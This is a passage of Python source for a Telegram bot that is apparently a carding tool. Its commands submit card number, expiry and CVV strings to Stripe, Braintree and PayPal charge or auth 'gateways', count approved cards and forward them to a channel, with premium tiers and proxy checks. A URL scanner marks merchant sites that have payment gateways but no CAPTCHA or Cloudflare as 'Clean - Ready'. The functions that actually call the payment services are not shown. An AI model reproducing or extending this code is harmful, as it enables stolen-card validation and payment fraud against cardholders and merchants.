            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - Stripe Auth - 1*

🔮 Initializing Gateway...
🔄 Connecting to Stripe API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Stripe Auth - 1*

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to Stripe API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_stripe(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
################################### VBV LOOKUP #############################
@bot.message_handler(commands=['vbv'])
def ch_handler(msg):
    """Check single card using vbv gateway"""
    # 🚧 Maintenance check
    if VBV_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *VBV Lookup Gateway Under Maintenance* 🚧

• The VBV lookup gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/ch <card_details>`

*Valid format*
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - VBV Lookup *

🔮 Initializing Gateway...
🔄 Connecting to Braintree API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Braintree VBV - 1*

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to B3 API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_vbv(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
################################### STRIPE SK CHARGE #############################
@bot.message_handler(commands=['sk'])
def ch_handler(msg):
    """Check single card using Stripe gateway"""
    # 🚧 Maintenance check
    if STRIPE_SK_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *Stripe SK Gateway Under Maintenance* 🚧

• The Stripe SK charge gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/ch <card_details>`

*Valid format*
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - Stripe SK Based - 1*

🔮 Initializing Gateway...
🔄 Connecting to Stripe API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Stripe Sk Based - 1*

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to Stripe API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_hosted(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result or "APPROVED CCN ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
#################################STRIPE CHARGE#########################################################
@bot.message_handler(commands=['st'])
def st_handler(msg):
    """Check single card using Stripe gateway"""
    # 🚧 Maintenance check
    if STRIPE_CHARGE_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *Stripe Charge Gateway Under Maintenance* 🚧

• The Stripe charge gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "ch"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/ch 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/ch <card_details>`

*Valid format*
`/ch 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /ch

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "ch", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - Stripe Charge 5$*

🔮 Initializing Gateway...
🔄 Connecting to Stripe API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_loading(message_id, progress, status):
        """Update loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - Stripe Charge 5$*

🔮 {status}
🔄 Processing your request
📡 Contacting payment gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_loading(processing.message_id, 20, "Initializing Gateway...")
            time.sleep(0.5)
            
            # Stage 2: Connecting to API
            update_loading(processing.message_id, 40, "Connecting to Stripe API...")
            time.sleep(0.5)
            
            # Stage 3: Validating card
            update_loading(processing.message_id, 60, "Validating card details...")
            time.sleep(0.5)
            
            # Stage 4: Processing payment
            update_loading(processing.message_id, 80, "Processing payment request...")
            time.sleep(0.5)
            
            # Stage 5: Finalizing
            update_loading(processing.message_id, 95, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_single_cc(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
            )
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()
#######################PAYPAL CHARGE##########################################################
@bot.message_handler(commands=['pp'])
def pp_handler(msg):
    """Check single card using PayPal gateway"""
    # 🚧 Maintenance check
    if PAYPAL_MAINTENANCE:
        return send_long_message(msg.chat.id, """
🚧 *PayPal Gateway Under Maintenance* 🚧

• The PayPal charge gateway is temporarily unavailable
• We're performing updates or server maintenance
• Please try again later

⚙️ *Status*: UNDER MAINTENANCE
💬 *Contact*: @mhitzxg
        """, reply_to_message_id=msg.message_id, parse_mode='Markdown')

    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can check cards

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (30 second cooldown for free users)
    if check_cooldown(msg.from_user.id, "pp"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait 30 seconds before checking again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    cc = None

    # Check if user replied to a message
    if msg.reply_to_message:
        # Extract CC from replied message
        replied_text = msg.reply_to_message.text or ""
        cc = normalize_card(replied_text)

        if not cc:
            return send_long_message(msg.chat.id, """
❌ *Invalid Card Format* ❌

• The replied message doesn't contain a valid card
• Please use the correct format:

*Valid format*
`/pp 4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        # Check if CC is provided as argument
        args = msg.text.split(None, 1)
        if len(args) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide a card to check
• Usage: `/pp <card_details>`

*Valid format*
`/pp 4556737586899855|12|2026|123`

• Or reply to a message containing card details with /pp

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

        # Try to normalize the provided CC
        raw_input = args[1]

        # Check if it's already in valid format
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "pp", 10)

    processing = send_long_message(msg.chat.id, """
⚙️ *Gateway - PayPal Charge - 2$*

🔮 Initializing PayPal Gateway...
🔄 Connecting to PayPal API
📡 Establishing secure connection

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your card""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def update_paypal_loading(message_id, progress, status):
        """Update PayPal loading animation"""
        bars = int(progress / 10)
        bar = "█" * bars + "▒" * (10 - bars)
        loading_text = f"""
⚙️ *Gateway - PayPal Charge - 2$*

🔮 {status}
🔄 Processing your request
📡 Contacting PayPal gateway

⏳ *Status*: [{bar}] {progress}%
⚡ Almost there..."""
        
        try:
            edit_long_message(msg.chat.id, message_id, loading_text, parse_mode='Markdown')
        except:
            pass

    def check_and_reply():
        try:
            # Stage 1: Initializing
            update_paypal_loading(processing.message_id, 15, "Initializing PayPal...")
            time.sleep(0.4)
            
            # Stage 2: Connecting to API
            update_paypal_loading(processing.message_id, 35, "Connecting to PayPal API...")
            time.sleep(0.4)
            
            # Stage 3: Validating card
            update_paypal_loading(processing.message_id, 55, "Validating card details...")
            time.sleep(0.4)
            
            # Stage 4: Processing payment
            update_paypal_loading(processing.message_id, 75, "Processing PayPal request...")
            time.sleep(0.4)
            
            # Stage 5: Finalizing
            update_paypal_loading(processing.message_id, 90, "Finalizing transaction...")
            time.sleep(0.3)
            
            result = check_card_paypal(cc)
            
            # Update stats
            if "APPROVED CC ✅" in result:
                update_stats(approved=1)
                update_user_stats(msg.from_user.id, approved=True)
            else:
                update_stats(declined=1)
                update_user_stats(msg.from_user.id, approved=False)
                
            # Add user info and proxy status to the result - FIXED VERSION
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # FIX: Simple string concatenation instead of replace()
            formatted_result = result + f"\n👤 Checked by: {user_info}\n🔌 Proxy: {proxy_status}"
            
            edit_long_message(msg.chat.id, processing.message_id, formatted_result, parse_mode='HTML')
            
            # If card is approved, send to channel
            if "APPROVED CC ✅" in result:
                notify_channel(formatted_result)
                
        except Exception as e:
            edit_long_message(msg.chat.id, processing.message_id, f"❌ Error: {str(e)}")

    threading.Thread(target=check_and_reply).start()

# ---------------- Gateway Scanner Handler ---------------- #
@bot.message_handler(commands=['url'])
def url_handler(msg):
    """Gateway Scanner - Scan URLs for payment gateways"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can scan URLs

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Check for spam (cooldown for free users)
    if check_cooldown(msg.from_user.id, "url"):
        return send_long_message(msg.chat.id, """
❌ *Cooldown Active* ❌

• You are in cooldown period
• Please wait before scanning again

✗ Upgrade to premium to remove cooldowns""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Get URLs from command arguments
    args = msg.text.split()[1:] if len(msg.text.split()) > 1 else []
    
    if not args:
        return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please provide at least one URL to scan
• Usage: `/url <website.com>` or `/url site1.com site2.com`

*Examples*
`/url example.com`
`/url site1.com site2.com site3.com`

✗ Contact admin if you need help: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Set cooldown for free users
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "url", 30)

    urls = args
    total_urls = len(urls)
    
    processing = send_long_message(msg.chat.id, f"""
🔍 *Gateway Scanner*

🚀 Analyzing {total_urls} URL(s)...
🔄 Scanning for payment gateways
📡 Checking security indicators

⏳ *Status*: [▒▒▒▒▒▒▒▒▒▒] 0%
⚡ Please wait while we process your request""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    if isinstance(processing, list) and len(processing) > 0:
        processing = processing[0]

    def scan_and_reply():
        try:
            results = []
            completed = 0
            
            def update_progress(percentage, status):
                bars = int(percentage / 5)
                bar = "█" * bars + "▒" * (20 - bars)
                loading_text = f"""
🔍 *Gateway Scanner*

🚀 {status}
🔄 Processing {completed}/{total_urls} URL(s)
📡 Scanning for gateways...

⏳ *Status*: [{bar}] {percentage}%
⚡ Almost there..."""
                try:
                    edit_long_message(msg.chat.id, processing.message_id, loading_text, parse_mode='Markdown')
                except:
                    pass

            # Process URLs
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(process_url, url) for url in urls]
                for future in futures:
                    result = future.result()
                    results.append(result)
                    completed += 1
                    percentage = int((completed * 100) // total_urls)
                    update_progress(percentage, f"Analyzing {completed}/{total_urls}...")

            # Generate report
            update_progress(100, "Generating report...")
            time.sleep(0.5)

            report_parts = []
            report_header = f"""
🔍 *Gateway Scanner Report*

📊 *Total URLs Processed*: {total_urls}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
            
            for res in results:
                part = "\n"
                security_detected = res['captcha'] or res['cloudflare']
                
                if res['error']:
                    part += f"❗️ *URL:* `{res['url']}`\n\n"
                    part += f"*» STATUS:* ❗️ *Error - Fetch Failed*\n`{res['error']}`\n"
                elif not res['gateways']:
                    part += f"⚠️ *URL:* `{res['url']}`\n\n"
                    part += "*» STATUS:* ⚠️ *No Gateways Found - Skipped*\n"
                else:
                    status_icon = "❌" if security_detected else "✅"
                    status_text = "Security Detected - Skipped" if security_detected else "Clean - Ready"
                    part += f"{status_icon} *URL:* `{res['url']}`\n\n"
                    part += f"*» STATUS:* {status_icon} *{status_text}*\n\n"
                    part += "*💳 Payment Gateways:*\n" + "\n".join([f"  ` • {g}`" for g in res['gateways']]) + "\n\n"
                    part += "*🛡️ Security Scan:*\n"
                    part += f"  ` • CAPTCHA:` {'Yes' if res['captcha'] else 'No'}\n"
                    part += f"  ` • Cloudflare:` {'Yes' if res['cloudflare'] else 'No'}\n\n"
                    sd = res['server_details']
                    part += "*🌐 Server Details:*\n"
                    part += f"  ` • IP Address:` {sd['ip']}\n"
                    part += f"  ` • Host:` {sd['host']}\n"
                    part += f"  ` • SSL Active:` {sd['ssl_active']} (Issued by: {sd['ssl_issuer']})\n"
                    part += f"  ` • Web Server:` {res['web_server']}\n"
                
                part += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                report_parts.append(part)

            report_footer = "\n✨ *Checked by @mhitzxg*"
            full_report = report_header + "".join(report_parts) + report_footer
            
            # Delete processing message and send results
            try:
                bot.delete_message(msg.chat.id, processing.message_id)
            except:
                pass
            
            send_long_message(msg.chat.id, full_report, parse_mode='Markdown', reply_to_message_id=msg.message_id)
            
        except Exception as e:
            error_msg = f"""
❌ *Error Scanning URLs* ❌

• An error occurred while processing your request
• Error: `{str(e)}`

✗ Contact admin if you need help: @mhitzxg"""
            try:
                bot.delete_message(msg.chat.id, processing.message_id)
            except:
                pass
            send_long_message(msg.chat.id, error_msg, parse_mode='Markdown', reply_to_message_id=msg.message_id)

    threading.Thread(target=scan_and_reply).start()

# ---------------- Start Bot ---------------- #
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = threading.Thread(target=run)
    t.daemon = True  # Make it a daemon thread so it doesn't block bot termination
    t.start()

# FIXED: Improved bot startup with proper error handling
def start_bot():
    """Start the bot with proper error handling"""
    max_retries = 5
    retry_delay = 10
    
    for attempt in range(max_retries):
        try:
            print(f"🎯 Attempt {attempt + 1}/{max_retries} to start MHITZXG AUTH CHECKER...")
            print("🤖 Bot is now running...")
            print("⚡ Powered by @mhitzxg & @pr0xy_xd")
            
            # Start Flask keep-alive
            keep_alive()
            
            # Clear any existing webhook first to avoid conflicts
            try:
                bot.remove_webhook()
                time.sleep(0.1)
            except:
                pass
            
            # Start bot polling WITHOUT reset_webhook parameter
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
            
            # If we reach here, the bot stopped gracefully
            print("🛑 Bot stopped gracefully")
            break
            
        except Exception as e:
            print(f"❌ Bot error (attempt {attempt + 1}/{max_retries}): {e}")
            
            if attempt < max_retries - 1:
                print(f"🔄 Restarting bot in {retry_delay} seconds...")
                time.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
            else:
                print("💥 Max retries reached. Bot failed to start.")
                break

if __name__ == '__main__':
    start_bot()
